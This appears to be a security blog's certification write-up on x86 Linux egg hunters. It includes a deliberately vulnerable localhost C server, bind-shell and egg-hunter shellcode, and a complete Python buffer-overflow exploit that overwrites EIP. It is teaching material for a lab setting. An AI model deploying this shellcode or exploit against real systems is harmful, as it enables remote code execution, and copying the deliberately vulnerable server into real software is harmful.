@@ -1,0 +1,1038 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Assignment Goals This paper is part of the certification process following the SLAE32 course (x86 Assembly Language and Shellcoding on Linux) intended to prepare me to become a future certified OSCE.
+If you are willing to pass the certification I really suggest you to wait until you finished your own certification process before reading that paper.
+Why? the goal of that certification is to practice and learn how to solve each assignment by yourself."><meta property="og:title" content="Assignment N°3 - Egg Hunter (C)" />
+<meta property="og:description" content="Assignment Goals This paper is part of the certification process following the SLAE32 course (x86 Assembly Language and Shellcoding on Linux) intended to prepare me to become a future certified OSCE.
+If you are willing to pass the certification I really suggest you to wait until you finished your own certification process before reading that paper.
+Why? the goal of that certification is to practice and learn how to solve each assignment by yourself." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.phrozen.io/docs/infosec/linux/slae32/ex3-egghunter/" />
+<meta property="article:published_time" content="2020-04-29T11:57:00+01:00" />
+<meta property="article:modified_time" content="2020-04-29T11:57:00+01:00" />
+<title>Assignment N°3 - Egg Hunter (C) | Phrozen</title>
+<link rel="icon" href="/images/favicon.ico" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.63abd10f627a7a06406140610b7ce76d028552de10d790fcb09f332349c39047.css" integrity="sha256-Y6vRD2J6egZAYUBhC3znbQKFUt4Q15D8sJ8zI0nDkEc=">
+<script defer src="/en.search.min.86e3cb1d1d29ddd8a3d2600962708437dcff21fc53cbdb40ba7f1f89e3ae2043.js" integrity="sha256-huPLHR0p3dij0mAJYnCEN9z/IfxTy9tAun8fieOuIEM="></script>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-159560668-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+<script src="https://kit.fontawesome.com/8da36c42cc.js" crossorigin="anonymous"></script>
+  
+</head>
+
+<body>
+  <input type="checkbox" class="hidden" id="menu-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      
+  <nav>
+<h2 class="book-brand">
+  <a href="/"><img src="/logo.svg" alt="Logo" /></a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li class="book-section-flat" >
+          
+  
+    <a href="/docs/projects/" class="">Projects</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="/docs/projects/windows/" class="collapsed ">Windows</a>
+  
+
+          
+  
+  
+  
+
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+    <a href="/docs/infosec/" class="">InfoSec</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="/docs/infosec/linux/" class="collapsed ">Linux</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="/docs/infosec/linux/slae32/" class="collapsed ">SLAE32</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="/docs/infosec/linux/slae32/ex7-crypters/" class="">Assignment N°7 - Crypters (Delphi/ASM)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/docs/infosec/linux/slae32/ex6-polymorphism/" class="">Assignment N°6 - Polymorphism</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/docs/infosec/linux/slae32/ex5-shellcode-analyzing/" class="">Assignment N°5 - Shellcode Analyzing / Dissecting</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/docs/infosec/linux/slae32/ex4-encoder/" class="">Assignment N°4 - Encoder (NASM)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/docs/infosec/linux/slae32/ex3-egghunter/" class="active">Assignment N°3 - Egg Hunter (C)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/docs/infosec/linux/slae32/ex2-reverseshell/" class="">Assignment N°2 - Reverse Shell (NASM)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/docs/infosec/linux/slae32/ex1-bindshell/" class="">Assignment N°1 - Bindshell (NASM)</a>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/docs/infosec/windows/" class="collapsed ">Windows</a>
+  
+
+          
+  
+  
+  
+
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+    <a href="/docs/programming/" class="">Programming</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="/docs/programming/windows/" class="collapsed ">Windows</a>
+  
+
+          
+  
+  
+  
+
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/docs/programming/general/" class="collapsed ">General</a>
+  
+
+          
+  
+  
+  
+
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+<ul>
+  
+  <li>
+    <a href="" target="_blank" rel="noopener"><strong>
+        Social Networks
+      </strong></a>
+  </li>
+  
+  <li>
+    <a href="https://www.linkedin.com/in/jlesueur/" target="_blank" rel="noopener"><i class='fa fa-linkedin'></i>
+        Linkedin
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://www.twitter.com/darkcodersc" target="_blank" rel="noopener"><i class='fa fa-twitter'></i>
+        Twitter
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/DarkCoderSc" target="_blank" rel="noopener"><i class='fa fa-github'></i>
+        Github
+      </a>
+  </li>
+  
+  <li>
+    <a href="" target="_blank" rel="noopener"><strong>
+        Other Stuff
+      </strong></a>
+  </li>
+  
+  <li>
+    <a href="/disclaimer/disclaimer" target="_blank" rel="noopener">
+        Legal
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var menu=document.querySelector("aside.book-menu nav");addEventListener("beforeunload",function(event){localStorage.setItem("menu.scrollTop",menu.scrollTop);});menu.scrollTop=localStorage.getItem("menu.scrollTop");})();</script>
+
+
+ 
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Assignment N°3 - Egg Hunter (C)</strong>
+
+  <label for="toc-control">
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+  </label>
+</div>
+
+
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="assignment-goals">Assignment Goals</h1>
+<p><img src="/images/202005/slae32-banner.png" alt="SLAE32" /></p>
+<blockquote class="book-hint warning">
+  <p>This paper is part of the certification process following the <a href="https://www.pentesteracademy.com/course?id=3">SLAE32 course</a> (x86 Assembly Language and Shellcoding on Linux) intended to prepare me to become a future certified OSCE.</p>
+<p>If you are willing to pass the certification I really suggest you to wait until you finished your own certification process before reading that paper.</p>
+<p>Why? the goal of that certification is to practice and learn how to solve each assignment by yourself. If you read this paper you will get spoiled and seriously oriented to my personal solution and take the risk to abuse of some shortcuts.</p>
+<p>Student ID: <strong>SLAE-1530</strong></p>
+
+</blockquote>
+
+<ol>
+<li>
+<p>Study about the Egg Hunter shellcode.</p>
+</li>
+<li>
+<p>Create a working demo of the Egghunter.</p>
+</li>
+<li>
+<p>Should be configurable for different payloads.</p>
+</li>
+</ol>
+<h1 id="what-is-an-egg-hunter-shellcode-">What is an Egg Hunter Shellcode ?</h1>
+<blockquote class="book-hint warning">
+  <p>Egg Hunting is a technique which is part of shellcoding and binary exploitation.</p>
+<p>It is recommended to have a minimum knowledge about classic binary exploitation techniques and shellcoding to understand the whole concept.</p>
+<p>It is also recommended to have solid basis about C programming in order to understand all demo codes in this paper.</p>
+
+</blockquote>
+
+<p>An egg hunter is a very small piece of shellcode designed to find another shellcode in memory (usually a bigger one). To do so, it scans the whole process memory in search of a special pattern. This pattern is called an egg and is preceded from the the second and bigger shellcode. When an egg is found in memory, the egg hunter shellcode will redirect execution flow to the second one.</p>
+<p>An egg is composed of 4 bytes (the size of a memory address in x86-32 processors) for example <code>0x44434241</code> (<code>ABCD</code> Little Endian). We generally repeat the egg once to avoid &ldquo;collisions&rdquo;.</p>
+<p>Imagine if we choose <code>ABCD</code> as our egg, <code>ABCD</code> is a common string and we could find this pattern at multiple memory location but <code>ABCDABCD</code> less likely.</p>
+<p><code>ABCD</code> is not a good choice anyway since it is too common, even if we repeat it. It is important to choose something you don&rsquo;t often see in programs and memory, for example <code>egg!</code> or <code>3gg!</code>.</p>
+<blockquote class="book-hint info">
+  Throughout this paper we will use <code>egg!</code> (<code>0x21676765</code>) as the value of our egg, feel free to chose yours and adapt each pieces of code and commands.
+</blockquote>
+
+<p>When the egg hunter shellcode find the correct memory offset for second stage, it redirect execution flow to second shellcode. The offset (memory address) of the second shellcode is usually the offset of the egg location <code>+8</code> bytes. (<code>2x</code> egg size).</p>
+<p>We often use egg hunting technique when we lack of space for our real shellcode.</p>
+<p>Imagine a TCP Bind Shell shellcode with a size of 150 bytes but the vulnerable program only have 60 bytes available for its buffer space. We would first write somewhere else in memory the bigger shellcode (our egg in addition of the TCP Bind Shell), then we would exploit the vulnerable buffer in executing our egg hunter shellcode to find and redirect execution flow to the TCP Bind Shell.</p>
+<h1 id="understanding-egg-hunters">Understanding Egg Hunters</h1>
+<p>The best way to understand how egg hunters works is to create deliberately a vulnerable application.</p>
+<p>We will use our <a href="http://127.0.0.1:1313/docs/linux/slae32/ex1-bindshell/">TCP Bindshell</a> shellcode (~224 Bytes) as final payload. 224 Bytes is quite huge for a shellcode, it is perfect to demonstrate the real use of egg hunters.</p>
+<p>We will create a tiny server application with at least two methods, each method represent a stage during our exploitation, respectively:</p>
+<p><strong>First method</strong> (first stage) will create a child thread (with its own stack) and allow a client to store up to 1024 bytes in its stack. Imagine this method like something perfectly harmless to cache some data in memory before doing additional actions. This is the perfect location to store our TCP Bindshell shellcode.</p>
+<p><strong>Second method</strong> (second stage) will create another child thread and allow a client to store a string in an uncontrolled buffer. This method will be deliberately vulnerable to buffer overflow attack. This is where we will write and execute our egg hunter shellcode. When executed our egg hunter will attempt to locate the pattern of our second payload and redirect execution flow.</p>
+<p>Finally for safety reasons, our server application will only listen for localhost clients.</p>
+<h2 id="vulnerable-server-application-c">Vulnerable Server Application (C)</h2>
+<pre><code>/*
+	Jean-Pierre LESUEUR (@DarkCoderSc)
+	jplesueur@phrozen.io
+	https://www.phrozen.io/
+	https://github.com/darkcodersc
+
+	License : MIT
+
+	---
+
+	SLAE32 Assignment 3 : Linux x86-32 Egg Hunter Research.
+
+	---
+
+	gcc egg-reallife.c -o egg-reallife -z execstack -no-pie -fno-stack-protector -pthread
+
+	Warning: This C program is willingly vulnerable to buffer overflow which could led to remote code execution.
+	         (!) Do not copy paste pieace of code without real caution (!)
+*/
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;sys/socket.h&gt; 
+#include &lt;netinet/in.h&gt; 
+#include &lt;ctype.h&gt;
+
+/****************************************************************************************************
+
+	Server Thread Child Thread: Egg Host (cmd=1) for phase n°1.
+
+	In our scenario this would be phase n°1.
+
+	Imagine CacheMe() as a perfectly secured function to cache some data in memory. We have can cache
+	up to 1KiB of data per thread. Far sufficient to host our real shellcode payload.
+
+****************************************************************************************************/
+void *CacheMe(void *param) {
+	int client = (int)param; 
+
+	char buffer[1024]; // Buffer that will contain our future egg + shellcod
+
+	// Waiting for data from client.
+	int result = recv(client, buffer, sizeof(buffer), 0);
+	if (result &lt;= 0) {
+		printf(&quot;Could not receive data from client.\n&quot;);
+	} else
+		printf(&quot;Buffer successfully filled with %d bytes of data.\n&quot;, result);	
+
+	///
+	close(client);
+}
+
+/****************************************************************************************************
+
+	Server Thread Child Thread: Buffer Overflow Location (cmd=2) for phase n°2.
+
+	In our scenario this would be phase n°2.
+
+	Image ExploitMe() as a function vulnerable to buffer overflow but with a small buffer. 
+	However it is sufficient to place our egg hunter shellcode here to locate our second and real shellcode
+	payload.
+
+****************************************************************************************************/
+void *ExploitMe(void *param) {
+	char feedback[60];
+	char buffer[200];
+	///
+
+	int client = (int)param; 
+
+	int result = recv(client, buffer, sizeof(buffer), 0);
+
+	printf(&quot;Received %d bytes for feedback.&quot;);
+
+	strcpy(feedback, buffer); // who cares about security? :-P
+}
+
+/****************************************************************************************************
+
+	Server Thread
+
+	This server accept two commands:
+		1. Cache some data in child thread stack (memory).
+		2. Write data to an uncontrolled buffer (In our scenario, a fake rating system).
+
+****************************************************************************************************/
+void *Server() {
+	printf(&quot;Server thread has started.\n&quot;);
+
+	/*
+		Create a new socket
+	*/
+	int s = socket(AF_INET, SOCK_STREAM, 0);
+	if (s == 0) {
+		printf(&quot;Could not create socket&quot;);		
+		
+		pthread_exit(NULL);
+	}
+
+	printf(&quot;Socket created with handle:%d\n&quot;, s);
+
+	/*
+		Avoid error already in use.
+	*/
+	int optval = 1;
+	int result = setsockopt(s, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &amp;optval, sizeof(int));
+	if (result == -1) {
+		printf(&quot;Could not call setsockopt().&quot;);
+
+		close(s);
+
+		pthread_exit(NULL);
+	}
+
+	/*
+		Bind socket to port.
+	*/
+	struct sockaddr_in saddr_in;
+
+	saddr_in.sin_family      = AF_INET;
+	saddr_in.sin_port        = htons(1403); // Listening on port 1403.
+	saddr_in.sin_addr.s_addr = 16777343;    // Listenning on address 127.0.0.1.
+
+	result = bind(s, (struct sockaddr*)&amp;saddr_in, sizeof(struct sockaddr_in));
+	if (result == -1) {
+		printf(&quot;Could not bind socket.\n&quot;);
+
+		close(s);
+
+		pthread_exit(NULL);
+	}
+	printf(&quot;Socket successfully binded.\n&quot;);
+
+	/*
+		Start listening
+	*/
+	result = listen(s, 5);
+	if (result == -1) {
+		printf(&quot;Could not listen.\n&quot;);
+
+		close(s);
+
+		pthread_exit(NULL);
+	}
+	printf(&quot;Listening...\n&quot;);
+
+	/*
+		Wait for new clients to connect.
+	*/	
+	for (;;) {
+		int client = accept(s, NULL, NULL);
+		///
+
+		if (client &lt; 0)
+			break;
+
+		printf(&quot;New client connected our server with handle: %d\n&quot;, client);
+
+		char cmd[1];		
+		result = recv(client, cmd, sizeof(cmd), 0);
+		if (result &lt;= 0)
+			continue;			
+
+		if (!isdigit(*cmd)) {
+			printf(&quot;Bad command format.\n&quot;);
+
+			continue;
+		}
+		
+		int icmd = atoi(cmd);
+
+		printf(&quot;command=[%d]\n&quot;, icmd);
+
+		pthread_t thread;	
+
+		switch(icmd) {
+			case 1: 
+				pthread_create(&amp;thread, NULL, CacheMe, (void *)client);
+
+				break;
+			case 2: 
+				pthread_create(&amp;thread, NULL, ExploitMe, (void *)client);
+
+				break;
+
+			default:
+				close(client);
+		}		
+	}
+
+	close(s);
+
+	///
+	pthread_exit(NULL);
+}
+
+/****************************************************************************************************
+
+	Program Entry Point
+
+****************************************************************************************************/
+void main() {
+	pthread_t thread;
+
+	pthread_create(&amp;thread, NULL, Server, NULL); // Create a new thread.
+
+	pthread_join(thread, NULL); // Wait for thread to finish his task.	
+
+	return;
+}
+</code></pre><p>We can compile and execute our server using bellow commands:</p>
+<p>local@user# <code>gcc egg-reallife.c -o egg-reallife -z execstack -no-pie -fno-stack-protector -pthread</code></p>
+<p>local@user# <code>sudo ./egg-reallife</code></p>
+<blockquote class="book-hint warning">
+  <p>Be sure ASLR is disabled on machine that host the vulnerable server.</p>
+<p>TCP Bindshell shellcode require root privilege to bind on port 443. We must run our server as root.</p>
+
+</blockquote>
+
+<p>By default, it will listen for incomming clients on port <code>1403</code>, feel free to use your favorite port number.</p>
+<p><code>16777343</code> is the translation of <code>127.0.0.1</code> and <strong>should not be changed</strong>.</p>
+<h2 id="writing-our-exploit-python">Writing our exploit (Python)</h2>
+<p>At this point, you should have your own vulnerable server running and waiting for commands.</p>
+<p>We will now focus on our exploit script.</p>
+<blockquote class="book-hint info">
+  We chose <code>egg!</code> as our egg pattern, feel free to use your own one but don&rsquo;t forget to update exploit code consequently.
+</blockquote>
+
+<h3 id="generate-an-egg-hunter-using-msf-egghunter">Generate an Egg Hunter using <code>msf-egghunter</code></h3>
+<p>This step requires Metasploit Framework which comes with <code>msg-egghunter</code>.</p>
+<p>We can create our Egg Hunter shellcode using the following command:</p>
+<p>local@user# <code>msf-egghunter -f python -e egg! -v egg_hunter -p linux -a x86</code></p>
+<p>Option <code>-v</code> is used to name our python variable that host the shellcode.</p>
+<h4 id="result">Result</h4>
+<pre><code>egg_hunter =  b&quot;&quot;
+egg_hunter += b&quot;\xfc\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd&quot;
+egg_hunter += b&quot;\x80\x3c\xf2\x74\xf1\xb8\x65\x67\x67\x21\x89&quot;
+egg_hunter += b&quot;\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7&quot;
+</code></pre><h3 id="prepare-our-shellcode-tcp-bindshell">Prepare our Shellcode (TCP Bindshell)</h3>
+<p>Remember, we must write two times our egg pattern before the shellcode itself.</p>
+<p>Our pattern <code>egg!</code> encoded in hex (Little Endian) equal to <code>\x65\x67\x67\x21</code></p>
+<h4 id="result-1">Result</h4>
+<pre><code># Prefixed by our egg token &quot;egg!egg!&quot;.
+shellcode =  b&quot;&quot;
+shellcode += b&quot;\x65\x67\x67\x21&quot; # egg!
+shellcode += b&quot;\x65\x67\x67\x21&quot; # egg!
+
+# Shellcode payload (TCP Bindshell port 443)
+shellcode += b&quot;\x89\xe5\x31\xc0\x31\xdb\x31\xd2\x31\xf6\x31\xc9\xb1\x1e\x50\xe2&quot;
+shellcode += b&quot;\xfd\x89\xec\xb3\x01\xc6\x44\x24\xf8\x01\xc6\x44\x24\xf4\x02\x83&quot;
+shellcode += b&quot;\xec\x0c\x89\xe1\xb0\x66\xcd\x80\x89\xc6\x31\xc0\x80\xc3\x0d\xc6&quot;
+shellcode += b&quot;\x44\x24\xfc\x04\x83\xec\x04\x89\x64\x24\xfc\xc6\x44\x24\xf8\x02&quot;
+shellcode += b&quot;\xc6\x44\x24\xf4\x01\x89\x74\x24\xf0\x83\xec\x10\x89\xe1\xb0\x66&quot;
+shellcode += b&quot;\xcd\x80\x31\xc0\x80\xeb\x0c\xb0\x01\xb4\xbb\x66\x89\x44\x24\xf2&quot;
+shellcode += b&quot;\xc6\x44\x24\xf0\x02\x31\xc0\xb0\x10\x29\xc4\xc6\x44\x24\xfc\x10&quot;
+shellcode += b&quot;\x89\x64\x24\xf8\x89\x74\x24\xf4\x83\xec\x0c\x89\xe1\x31\xc0\xb0&quot;
+shellcode += b&quot;\x66\xcd\x80\x80\xc3\x02\x89\x74\x24\xf8\x83\xec\x08\x89\xe1\xb0&quot;
+shellcode += b&quot;\x66\xcd\x80\xfe\xc3\x89\x74\x24\xf4\x83\xec\x0c\x89\xe1\xb0\x66&quot;
+shellcode += b&quot;\xcd\x80\x89\xc3\x31\xc9\x31\xc0\xb0\x3f\xcd\x80\xfe\xc1\x80\xf9&quot;
+shellcode += b&quot;\x02\x7e\xf3\x31\xc0\x31\xdb\x31\xc9\xc7\x44\x24\xf8\x2f\x2f\x73&quot;
+shellcode += b&quot;\x68\xc7\x44\x24\xf4\x2f\x62\x69\x6e\x83\xec\x0c\x89\xe3\x83\xec&quot;
+shellcode += b&quot;\x04\x89\xe2\x89\x5c\x24\xfc\x83\xec\x04\x89\xe1\xb0\x0b\xcd\x80&quot;
+</code></pre><h3 id="write-our-tcp-bindshell-shellcode-to-target-process-memory">Write our TCP Bindshell shellcode to target process memory.</h3>
+<p>After opening a new connection to target process, we will send our TCP Bindshell shellcode (<code>shellcode</code> variable) using command N°1 <code>\x31</code>.</p>
+<p>This will place our shellcode somewhere in target process memory.</p>
+<h3 id="exploiting-buffer-overflow">Exploiting Buffer Overflow</h3>
+<blockquote class="book-hint info">
+  This part is not covered in detail, we consider your are already familiar with exploiting buffer overflows.
+</blockquote>
+
+<p>Required steps (with help of GDB) are:</p>
+<ul>
+<li>Find EIP offset.</li>
+<li>Confirm if we control EIP.</li>
+<li>Find possible bad chars (Not required in this case).</li>
+<li>Find max size for our payload.</li>
+<li>Create our payload. NOP sled + Egg Hunter shellcode.</li>
+<li>Identify a stack address that point in the middle of our NOP sled.</li>
+<li>Overwrite EIP with this stack address.</li>
+</ul>
+<p>When final payload is ready we will open a new connection to target process, this time with command N°2 <code>\x32</code>. This will exploit the buffer overflow and execute our Egg Hunter shellcode, after few seconds our TCP Bindshell should be available on port 443.</p>
+<h3 id="final-code">Final Code</h3>
+<pre><code>#!/usr/bin/python3
+
+'''
+	Jean-Pierre LESUEUR (@DarkCoderSc)
+	jplesueur@phrozen.io
+	https://www.phrozen.io/
+	https://github.com/darkcodersc
+
+	License : MIT
+
+	---
+
+	SLAE32 Assignment 3 : Linux x86-32 Egg Hunter Research.
+
+	---
+
+	Description:
+		This is the full working (LOCAL) exploit code for egg-reallife.c program to demonstrate our
+		egg hunter is applied to real life situation.
+'''
+
+from socket import *
+import sys
+import time
+import struct
+
+#
+# Log Defs
+#
+def success(message):
+    print(&quot;[\033[32m+\033[39m] &quot; + message)
+
+def fail(message):
+    print(&quot;[\033[31mx\033[39m] &quot; + message)
+
+def warn(message):
+    print(&quot;[\033[34m!\033[39m] &quot; + message)
+
+def info(message):
+    print(&quot;[\033[34m*\033[39m] &quot; + message)
+
+#
+# Payload 1 : cat /etc/passwd.
+#
+
+# Prefixed by our egg token &quot;egg!egg!&quot;.
+shellcode =  b&quot;&quot;
+shellcode += b&quot;\x65\x67\x67\x21&quot; # egg!
+shellcode += b&quot;\x65\x67\x67\x21&quot; # egg!
+
+# Shellcode payload (TCP Bindshell port 443)
+shellcode += b&quot;\x89\xe5\x31\xc0\x31\xdb\x31\xd2\x31\xf6\x31\xc9\xb1\x1e\x50\xe2&quot;
+shellcode += b&quot;\xfd\x89\xec\xb3\x01\xc6\x44\x24\xf8\x01\xc6\x44\x24\xf4\x02\x83&quot;
+shellcode += b&quot;\xec\x0c\x89\xe1\xb0\x66\xcd\x80\x89\xc6\x31\xc0\x80\xc3\x0d\xc6&quot;
+shellcode += b&quot;\x44\x24\xfc\x04\x83\xec\x04\x89\x64\x24\xfc\xc6\x44\x24\xf8\x02&quot;
+shellcode += b&quot;\xc6\x44\x24\xf4\x01\x89\x74\x24\xf0\x83\xec\x10\x89\xe1\xb0\x66&quot;
+shellcode += b&quot;\xcd\x80\x31\xc0\x80\xeb\x0c\xb0\x01\xb4\xbb\x66\x89\x44\x24\xf2&quot;
+shellcode += b&quot;\xc6\x44\x24\xf0\x02\x31\xc0\xb0\x10\x29\xc4\xc6\x44\x24\xfc\x10&quot;
+shellcode += b&quot;\x89\x64\x24\xf8\x89\x74\x24\xf4\x83\xec\x0c\x89\xe1\x31\xc0\xb0&quot;
+shellcode += b&quot;\x66\xcd\x80\x80\xc3\x02\x89\x74\x24\xf8\x83\xec\x08\x89\xe1\xb0&quot;
+shellcode += b&quot;\x66\xcd\x80\xfe\xc3\x89\x74\x24\xf4\x83\xec\x0c\x89\xe1\xb0\x66&quot;
+shellcode += b&quot;\xcd\x80\x89\xc3\x31\xc9\x31\xc0\xb0\x3f\xcd\x80\xfe\xc1\x80\xf9&quot;
+shellcode += b&quot;\x02\x7e\xf3\x31\xc0\x31\xdb\x31\xc9\xc7\x44\x24\xf8\x2f\x2f\x73&quot;
+shellcode += b&quot;\x68\xc7\x44\x24\xf4\x2f\x62\x69\x6e\x83\xec\x0c\x89\xe3\x83\xec&quot;
+shellcode += b&quot;\x04\x89\xe2\x89\x5c\x24\xfc\x83\xec\x04\x89\xe1\xb0\x0b\xcd\x80&quot;
+
+#
+# Payload 2 : Egg Hunter.
+# Generated with msf-egghunter -f python -e egg! -v egg_hunter -p linux -a x86
+#
+egg_hunter =  b&quot;&quot;
+egg_hunter += b&quot;\xfc\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd&quot;
+egg_hunter += b&quot;\x80\x3c\xf2\x74\xf1\xb8\x65\x67\x67\x21\x89&quot;
+egg_hunter += b&quot;\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7&quot;
+
+#
+# Networking Function
+#
+def SubmitPhasePayload(cmd, payload):
+	s = socket(AF_INET, SOCK_STREAM)
+
+	if (s.connect_ex((LHOST, LPORT)) == 0):
+		success(f&quot;Successfully connected to {LHOST}:{LPORT}.&quot;);
+
+		# Send command n°1 (cache data in memory)
+
+		info(f&quot;Send command = {cmd}&quot;);
+
+		s.send(cmd);
+
+		info(&quot;Wait 2 seconds...&quot;);
+
+		time.sleep(2);
+
+		info(&quot;Send payload stage.&quot;);
+
+		s.send(payload);
+
+		success(&quot;Payload successfully sent.&quot;)
+
+		s.close(); # Gracefully close connection.	
+
+		return True
+	else:
+		fail(f&quot;Could not connect to {LHOST}:{LPORT}&quot;);	
+
+	return False
+
+
+#
+# Exploitation
+#
+LHOST = &quot;127.0.0.1&quot;
+LPORT = 1403
+
+info(&quot;Phase n°1: Sending shellcode to target server memory.&quot;)
+if (SubmitPhasePayload(b&quot;\x31&quot;, shellcode)):
+	success(&quot;Phase n°1 : Success.&quot;)
+
+	info(&quot;Phase n°2: Exploiting buffer overflow and sending egg hunter shellcode.&quot;)
+
+	#
+	# Create buffer overflow payload.
+	#
+	payload =  b&quot;&quot;
+	
+	# (+): Locate EIP Offset.
+	# pattern_create.rb -l 250
+	#payload += &quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0&quot;.encode('ascii')
+	#payload += &quot;Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1A&quot;.encode('ascii')
+	#payload += &quot;e2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3&quot;.encode('ascii')
+	#payload += &quot;Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2A&quot;.encode('ascii')
+	# (+): Result = pattern_offset.rb -q &quot;6Ac7&quot;(offset=80)
+
+	eip_offset = 80
+
+	# (+): Test if we control EIP.
+	#payload += b&quot;\x41&quot; * eip_offset
+	#payload += b&quot;\x42&quot; * 4
+	# (+): Yes we did. 0x42424242 is in EIP.
+
+	# (+): Place and execute our egghunter shellcode.
+	nop_sled_size = (eip_offset - len(egg_hunter))
+
+	payload += b&quot;\x90&quot; * nop_sled_size       # NOP Sled.
+	payload += egg_hunter                    # Our egghunter shellcode goes here.
+	payload += b&quot;\x1c\xe3\xbf\xb6&quot;           # Stack address, ASLR must of course be disabled! Little Endian.
+	# (+): If correctly configured, shellcode should get triggered.
+
+	if (SubmitPhasePayload(b&quot;\x32&quot;, payload)):
+		success(&quot;Phase n°2 : Success.&quot;);
+		info(&quot;Please wait few seconds until egghunter shellcode trigger the other one...&quot;);
+	else:
+		fail(&quot;Phase n°2 : Failed.&quot;)
+else:
+	fail(&quot;Phase n°1 : Failed.&quot;)
+</code></pre><h3 id="test-me">Test Me</h3>
+<p>user@local# <code>chmod +x exploit.py &amp;&amp; ./exploit.py</code></p>
+<h4 id="result-2">Result</h4>
+<p><img src="/images/202006/Screenshot-2020-06-05-at-15.42.40.png" alt="Example" /></p>
+<h1 id="afterword">Afterword</h1>
+<p>Code files are available in the following Github repository:</p>
+<p><a href="https://github.com/DarkCoderSc/slae32-egghunters">https://github.com/DarkCoderSc/slae32-egghunters</a></p>
+<h2 id="bonus">Bonus</h2>
+<p>In bonus you will find two additional applications to understand more deeply how egg hunters works using C programming language.</p>
+<h3 id="bonus-1--egg-hunter-principle-applied-to-c-no-code-execution">Bonus 1 : Egg Hunter Principle applied to C (No Code Execution).</h3>
+<p>This program demonstrate how to retrieve data from memory using <code>access()</code> memory scanning method. <code>access()</code> is probably the most famous and used technique for creating efficient Egg Hunters.</p>
+<p>You will find the full code at this address : <a href="https://github.com/DarkCoderSc/slae32-egghunters/blob/master/egg-principle.c">https://github.com/DarkCoderSc/slae32-egghunters/blob/master/egg-principle.c</a></p>
+<h4 id="access-memory-scanning-in-c">Access Memory Scanning in C</h4>
+<pre><code>_Bool egg_hunt(unsigned int *ptr, char *egg_name, _Bool access_chk) {
+	_Bool access_violation = 0;
+	if (access_chk) {
+		access_violation = ((access((char *) ptr, F_OK) == -1) &amp;&amp; (errno == EFAULT));
+	}
+
+	if (!access_violation) {
+		char addr[9];
+
+		snprintf(addr, sizeof(addr), &quot;%08x&quot;, *ptr);
+
+		if (strcmp(addr, egg_name) == 0) {			
+			return 1;
+		}
+	}
+
+	///
+	return 0;
+}
+
+unsigned int egg_hunter() {
